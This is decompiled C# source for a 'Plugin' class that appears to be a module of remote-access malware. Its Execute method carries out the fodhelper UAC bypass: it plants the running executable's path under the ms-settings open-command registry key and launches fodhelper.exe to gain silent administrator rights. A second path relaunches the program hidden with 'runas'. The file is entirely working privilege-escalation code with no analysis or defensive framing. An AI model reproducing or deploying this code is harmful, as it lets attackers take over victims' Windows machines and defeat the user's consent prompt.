using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using Microsoft.Win32;

namespace Plugin
{
	// Token: 0x02000008 RID: 8
	public class Plugin
	{
		// Token: 0x06000010 RID: 16 RVA: 0x000021BC File Offset: 0x000003BC
		public static object UACFunc(int Method)
		{
			object result;
			try
			{
				bool flag = !Plugin.AdminCheck();
				if (flag)
				{
					if (Method != 0)
					{
						if (Method == 1)
						{
							Plugin.Execute();
							Environment.Exit(0);
						}
					}
					else
					{
						Process process = new Process
						{
							StartInfo = new ProcessStartInfo
							{
								FileName = "cmd",
								Arguments = "/k START \"\" \"" + Process.GetCurrentProcess().MainModule.FileName + "\" & EXIT",
								WindowStyle = ProcessWindowStyle.Hidden,
								Verb = "runas",
								UseShellExecute = true
							}
						};
						process.Start();
						Environment.Exit(0);
					}
				}
				else
				{
					result = "UAC Permissions Already!";
				}
			}
			catch (Exception ex)
			{
				result = ex.Message;
			}
			return result;
		}

		// Token: 0x06000011 RID: 17
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int WinExec([MarshalAs(UnmanagedType.VBByRefStr)] ref string exeName, int operType);

		// Token: 0x06000012 RID: 18 RVA: 0x000022A4 File Offset: 0x000004A4
		public static object Execute()
		{
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.CreateSubKey("Software\\Classes\\ms-settings\\shell\\open\\command");
			registryKey = currentUser.OpenSubKey("Software\\Classes\\ms-settings\\shell\\open\\command", true);
			registryKey.SetValue("", Process.GetCurrentProcess().MainModule.FileName);
			registryKey.SetValue("DelegateExecute", "");
			currentUser.Close();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
			string str = folderPath + "\\System32\\fodhelper.exe";
			string text = "cmd.exe /k START " + str + " & EXIT";
			Plugin.WinExec(ref text, 0);
			object result;
			return result;
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002338 File Offset: 0x00000538
		public static bool AdminCheck()
		{
			bool result;
			try
			{
				result = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}
	}
}
